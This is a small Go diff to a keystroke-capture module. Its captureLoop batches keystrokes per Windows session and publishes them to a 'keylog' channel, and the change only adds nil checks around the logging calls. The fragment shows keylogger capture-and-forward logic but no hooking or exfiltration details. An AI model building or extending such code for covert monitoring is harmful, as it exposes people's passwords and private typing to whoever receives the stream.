@@ -85,7 +85,9 @@ func vkToString(vk int) string {
 
 func captureLoop(ctx context.Context, id string, pub publisher, log *slog.Logger) {
 	sid := currentSessionID()
-	log.Info("keylog captureLoop iniciado", "session", id, "winSession", sid)
+	if log != nil {
+		log.Info("keylog captureLoop iniciado", "session", id, "winSession", sid)
+	}
 	_ = pub.Publish("keylog."+id, keyFrame{
 		Keys: fmt.Sprintf("[captura iniciada na sessao Windows %d]", sid),
 		Ts:   time.Now().UnixMilli(),
@@ -118,7 +120,7 @@ func captureLoop(ctx context.Context, id string, pub publisher, log *slog.Logger
 		case <-flush.C:
 			if buf.Len() > 0 {
 				frame := keyFrame{Keys: buf.String(), Ts: time.Now().UnixMilli()}
-				if err := pub.Publish("keylog."+id, frame); err != nil {
+				if err := pub.Publish("keylog."+id, frame); err != nil && log != nil {
 					log.Debug("keylog: falha ao publicar", "session", id, "erro", err)
 				}
 				buf.Reset()
